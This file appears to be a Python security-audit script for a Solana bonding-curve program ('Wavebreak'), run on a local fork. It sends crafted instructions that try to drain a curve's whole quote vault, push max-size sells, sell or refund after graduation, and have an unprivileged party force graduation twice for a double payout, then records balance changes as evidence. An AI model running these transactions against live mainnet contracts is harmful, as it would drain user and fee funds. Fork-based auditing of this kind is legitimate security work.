"""Retry the two Wavebreak cases whose earlier failures were fixture artifacts (empty ATA / wrong
quote mint), so their disposition rests on a real guard decision instead of a setup error:
  R1  exact-OUT asking for the WHOLE quote vault (fee-custody drain via the other code path)
  R2  holder sell AFTER forced graduation, using the curve's real quote mint (USDC)
  R3  repeated graduation attempts across all 7 Manual curves (idempotency, no double payout)
  R4  the largest-liquidity curve's sell conservation (accounting-capped?) at max size
"""
import sys, json, struct, base64
sys.path.insert(0,'/home/user/orca-audit/tools')
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey
WB="waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL=F.WSOL
actor=F.load_actor(); A=str(actor.pubkey())
ATA_WSOL="HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES={c["address"]:c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
def ata_of(o,m,p=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(o)),bytes(F.pk(p)),bytes(F.pk(m))],F.pk(F.ATA))[0])
def prog_of(m):
    v=F.get_account(m) or F.rpc.rpc("getAccountInfo",[m,{"encoding":"base64","commitment":"confirmed"}],url="https://api.mainnet-beta.solana.com")["result"]["value"]
    return (v or {}).get("owner") or F.TOKEN
def rd(a):
    v=F.get_account(a)
    if not v: return None
    raw=base64.b64decode(v["data"][0])
    o={"lamports":v["lamports"],"space":v["space"],"hash":F.hashlib.sha256(raw).hexdigest()}
    if v["space"]==165 and len(raw)>=72: o["amount"]=struct.unpack_from("<Q",raw,64)[0]
    if v["space"]==82 and len(raw)>=44: o["supply"]=struct.unpack_from("<Q",raw,36)[0]; o["decimals"]=raw[44]
    if v["space"]==2048 and len(raw)>=224:
        o["quoteAmount"]=struct.unpack_from("<Q",raw,208)[0]; o["baseAmount"]=struct.unpack_from("<Q",raw,216)[0]
        o["m1graduated"]=raw[413]
    return o
def M(k,w=False,s=False): return F.AM(k,writable=w,signer=s)
RES=[]
def case(name,ixs,watch,note=""):
    b={a:rd(a) for a in watch}; slot0=F.get_slot()
    r=F.send(ixs,actor); a={x:rd(x) for x in watch}; det=r.get("detail",{})
    logs=[l.strip() for l in det.get("logs",[])]
    d={}
    for k in watch:
        bb,aa=b.get(k) or {},a.get(k) or {}; e={}
        for f in ("lamports","amount","supply","quoteAmount","baseAmount","m1graduated"):
            if bb.get(f) is not None and bb.get(f)!=aa.get(f): e[f]=[bb.get(f),aa.get(f),(aa.get(f) or 0)-(bb.get(f) or 0)]
        if e: d[k]=e
    rec={"case":name,"note":note,"forkSlotBefore":slot0,"forkSlotAfter":F.get_slot(),"sig":r.get("result"),
         "err":det.get("err") or r.get("error"),"logs":logs,"deltas":d,"before":b,"after":a}
    RES.append(rec)
    print(f"\n### {name}  [{note}]")
    print("   err:",json.dumps(rec["err"])[:150])
    print("   logs:"," | ".join(l.split("log:")[-1].strip() for l in logs if "log:" in l or "failed" in l)[:300])
    print("   deltas:",json.dumps(d)[:700])
    return rec
def fund(ata,mint,amount):
    mv=F.get_account(mint); mraw=bytearray(base64.b64decode(mv["data"][0]))
    sup=struct.unpack_from("<Q",mraw,36)[0]; dec=mraw[44]
    v=F.get_account(ata); raw=bytearray(base64.b64decode(v["data"][0]))
    struct.pack_into("<Q",raw,64,amount)
    F.rpc.rpc("surfnet_setAccount",[ata,{"lamports":v["lamports"],"data":bytes(raw).hex(),"owner":v["owner"],"executable":False}],url=F.FORK)
    F.rpc.rpc("surfnet_setSupply",[mint,{"total":str(sup+amount)}],url=F.FORK)
    return {"amount":amount,"decimals":dec,"supplyBefore":sup,"forkSlot":F.get_slot(),
            "note":"fork-only funding of the attacker's own account (+supply) so guards are reachable; not exploit evidence"}
def sellix(curve,mint,vault,base_ata,quote_ata,qmint,tags,amount,partial=0,thr=None,bp=F.TOKEN,qp=None):
    d=struct.pack("<QB",amount&(2**64-1),partial)+ (b"\x00" if thr is None else b"\x01"+struct.pack("<QQ",*thr))
    return Instruction(F.pk(WB),bytes([tags])+d,[M(A,w=True,s=True),M(curve,w=True),M(mint,w=True),M(base_ata,w=True),
        M(qmint),M(vault,w=True),M(quote_ata,w=True),M(F.SYSTEM),M(F.ATA),M(bp),M(qp or prog_of(qmint))])

def main():
    USDC="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
    # ---- R1/R4: exact-out whole vault, on the two biggest-divergence WSOL curves, with funding kept ----
    import collections
    CUST={r["curve"]:r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}
    cands=sorted([(CUST[a]["divQuote"],a) for a,c in CURVES.items()
                  if c["quote_mint"]==WSOL and not any(m["graduated"] for m in c["graduation_methods"])
                  and CUST.get(a,{}).get("vaultQuote",0)>10**9],reverse=True)
    for div,T in cands[:2]:
        c=CURVES[T]; BASE=c["base_mint"]; VAULT=ata_of(T,WSOL)
        base_ata=ata_of(A,BASE); _,x=F.create_ata(A,BASE,F.TOKEN,A); F.send([x],actor)
        dec=F.get_account(BASE) and base64.b64decode(F.get_account(BASE)["data"][0])[44]
        big=10**(dec+9)   # 1e9 tokens - far beyond what the curve can absorb
        f=fund(base_ata,BASE,big)
        v0=rd(VAULT); whole=v0["amount"]
        case(f"WB-R1 exact-OUT the whole WSOL vault ({whole:,}) on {T[:10]} [excess {div:,}]",
             [sellix(T,BASE,VAULT,base_ata,ATA_WSOL,WSOL,11,whole,1,bp=F.TOKEN)],
             [A,ATA_WSOL,base_ata,T,VAULT,BASE],f"funded={f['amount']:,}; allow_partial_fill=1")
        case(f"WB-R1b exact-OUT half the vault on {T[:10]}",
             [sellix(T,BASE,VAULT,base_ata,ATA_WSOL,WSOL,11,whole//2,1,bp=F.TOKEN)],
             [A,ATA_WSOL,base_ata,T,VAULT,BASE],"bounded by reserves?")
        case(f"WB-R4 exact-IN max-u64 with partial fill on {T[:10]}",
             [sellix(T,BASE,VAULT,base_ata,ATA_WSOL,WSOL,10,2**64-1,1,bp=F.TOKEN)],
             [A,ATA_WSOL,base_ata,T,VAULT,BASE],"largest possible input; check payout cap")
        # conservation summary
        rec=RES[-1]
        b=T in rec["before"] and rec["before"][T] or {}
        a_=T in rec["after"] and rec["after"][T] or {}
        print(f"   -> payout {(rec['after'].get(ATA_WSOL) or {}).get('amount',0)-(rec['before'].get(ATA_WSOL) or {}).get('amount',0):+,}"
              f"  vault {(rec['after'].get(VAULT) or {}).get('amount',0)-(rec['before'].get(VAULT) or {}).get('amount',0):+,}"
              f"  accounting {(a_.get('quoteAmount',0)-b.get('quoteAmount',0)):+,}")
    # ---- R2: post-graduation holder exit with the curve's REAL quote mint ----
    for T in ["7pjREHYMKCouqnCTq3wNnEiAFnTVyncuq7jBfp7t7N9d","4U4kEQ4nHnF8PuXcCWq9FsTyHyZiCCbHMeMUjGStFj68"]:
        c=CURVES[T]; BASE=c["base_mint"]; QM=c["quote_mint"]; qp=prog_of(QM); bp=prog_of(BASE)
        VAULT=ata_of(T,QM,qp); aq=ata_of(A,QM,qp); ab=ata_of(A,BASE,bp)
        for m,p in ((QM,qp),(BASE,bp)):
            _,x=F.create_ata(A,m,p,A); F.send([x],actor)
        dec=(base64.b64decode(F.get_account(BASE)["data"][0])[44]) if F.get_account(BASE) else 9
        fund(ab,BASE,10**(dec+3))
        st=rd(T) or {}
        case(f"WB-R2 holder sell after forced graduation, curve {T[:10]} (USDC quote, curve state {st.get('m1graduated')})",
             [sellix(T,BASE,VAULT,ab,aq,QM,10,10**(dec+1),1,bp=bp,qp=qp)],
             [A,aq,ab,T,VAULT,BASE],"graduated curve: exits still honoured? payout vs accounting")
        case(f"WB-R2b holder tokenRefund after forced graduation, curve {T[:10]}",
             [Instruction(F.pk(WB),bytes([12]),[M(A,w=True,s=True),M(T,w=True),M(QM),M(VAULT,w=True),
              M(aq,w=True),M(BASE,w=True),M(ab,w=True),M(F.SYSTEM),M(bp),M(qp),M(F.ATA)])],
             [A,aq,ab,T,VAULT,BASE],"refund path after graduation")
    # ---- R3: all Manual curves, graduation once + replay ----
    manual=[c for c in CURVES.values() if any(m["label"]==2 and not m["graduated"] for m in c["graduation_methods"])]
    n_done=0
    for c in manual:
        T=c["address"]; BASE=c["base_mint"]; QM=c["quote_mint"]; qp=prog_of(QM); bp=prog_of(BASE)
        VAULT=ata_of(T,QM,qp); dest=[m["destination"] for m in c["graduation_methods"] if m["label"]==2][0]
        dq,db=ata_of(dest,QM,qp),ata_of(dest,BASE,bp); aq,ab=ata_of(A,QM,qp),ata_of(A,BASE,bp)
        g=Instruction(F.pk(WB),bytes([33]),[M(A,w=True,s=True),M(dest),M(T,w=True),M(QM),M(VAULT,w=True),
            M(aq,w=True),M(dq,w=True),M(BASE,w=True),M(db,w=True),M(F.SYSTEM),M(F.ATA),M(qp),M(bp)])
        before_v=rd(VAULT) or {}
        case(f"WB-R3 forced graduateManual on {T[:10]} (quote {c['quote_amount']:,} vs target {c['graduation_target']:,})",
             [g],[A,aq,ab,T,VAULT,dq,db,BASE],"unprivileged third party finalizes a live launch")
        case(f"WB-R3b repeat graduateManual on {T[:10]}",[g],[A,aq,ab,T,VAULT,dq,db,BASE],"must not pay twice")
        n_done+=1
        if n_done>=5: break
    json.dump({"results":RES},open("/home/user/orca-audit/evidence/WBF_final2.json","w"),indent=1)
    print("\nsaved evidence/WBF_final2.json")
if __name__=="__main__":
    main()
